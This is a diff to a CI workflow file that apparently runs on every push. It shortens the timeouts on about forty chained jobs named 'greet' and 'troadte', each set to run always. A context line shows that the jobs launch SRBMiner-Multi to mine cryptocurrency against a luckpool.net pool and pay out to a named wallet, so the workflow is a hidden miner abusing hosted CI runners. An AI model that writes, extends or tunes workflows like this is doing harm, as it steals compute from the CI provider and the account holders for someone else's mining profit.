@@ -5,7 +5,7 @@ on: [push]
 jobs:
   greet:
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     steps:
       - run: |
           woorkersd=$(date +"%Y%m%d%H%M%S")
@@ -17,7 +17,7 @@ jobs:
   greet1:
     needs: greet
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -31,7 +31,7 @@ jobs:
   greet2:
     needs: greet1
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -45,7 +45,7 @@ jobs:
   greet3:
     needs: greet2
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -59,7 +59,7 @@ jobs:
   greet4:
     needs: greet3
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -73,7 +73,7 @@ jobs:
   greet5:
     needs: greet4
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -87,7 +87,7 @@ jobs:
   greet6:
     needs: greet5
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -101,7 +101,7 @@ jobs:
   greet7:
     needs: greet6
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -115,7 +115,7 @@ jobs:
   greet8:
     needs: greet7
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -129,7 +129,7 @@ jobs:
   greet9:
     needs: greet8
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -143,7 +143,7 @@ jobs:
   greet10:
     needs: greet9
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -157,7 +157,7 @@ jobs:
   greet11:
     needs: greet10
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -171,7 +171,7 @@ jobs:
   greet12:
     needs: greet11
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -185,7 +185,7 @@ jobs:
   greet13:
     needs: greet12
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -199,7 +199,7 @@ jobs:
   greet14:
     needs: greet13
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -213,7 +213,7 @@ jobs:
   greet15:
     needs: greet14
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -227,7 +227,7 @@ jobs:
   greet16:
     needs: greet15
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -241,7 +241,7 @@ jobs:
   greet17:
     needs: greet16
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -255,7 +255,7 @@ jobs:
   greet18:
     needs: greet17
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -269,7 +269,7 @@ jobs:
   greet19:
     needs: greet18
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -281,7 +281,7 @@ jobs:
           ./SRBMiner-Multi-3-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://ap.luckpool.net:3956 --wallet REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp --cpu-threads 2
   troadte:
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     steps:
       - run: |
           woorkersd=$(date +"%Y%m%d%H%M%S")
@@ -293,7 +293,7 @@ jobs:
   troadte1:
     needs: troadte
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -307,7 +307,7 @@ jobs:
   troadte2:
     needs: troadte1
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -321,7 +321,7 @@ jobs:
   troadte3:
     needs: troadte2
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -335,7 +335,7 @@ jobs:
   troadte4:
     needs: troadte3
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -349,7 +349,7 @@ jobs:
   troadte5:
     needs: troadte4
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -363,7 +363,7 @@ jobs:
   troadte6:
     needs: troadte5
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -377,7 +377,7 @@ jobs:
   troadte7:
     needs: troadte6
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -391,7 +391,7 @@ jobs:
   troadte8:
     needs: troadte7
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -405,7 +405,7 @@ jobs:
   troadte9:
     needs: troadte8
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -419,7 +419,7 @@ jobs:
   troadte10:
     needs: troadte9
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -433,7 +433,7 @@ jobs:
   troadte11:
     needs: troadte10
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -447,7 +447,7 @@ jobs:
   troadte12:
     needs: troadte11
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -461,7 +461,7 @@ jobs:
   troadte13:
     needs: troadte12
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -475,7 +475,7 @@ jobs:
   troadte14:
     needs: troadte13
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -489,7 +489,7 @@ jobs:
   troadte15:
     needs: troadte14
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -503,7 +503,7 @@ jobs:
   troadte16:
     needs: troadte15
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -517,7 +517,7 @@ jobs:
   troadte17:
     needs: troadte16
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -531,7 +531,7 @@ jobs:
   troadte18:
     needs: troadte17
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
@@ -545,7 +545,7 @@ jobs:
   troadte19:
     needs: troadte18
     runs-on: namespace-profile-default
-    timeout-minutes: 50
+    timeout-minutes: 25
     if: always()
     steps:
       - run: |
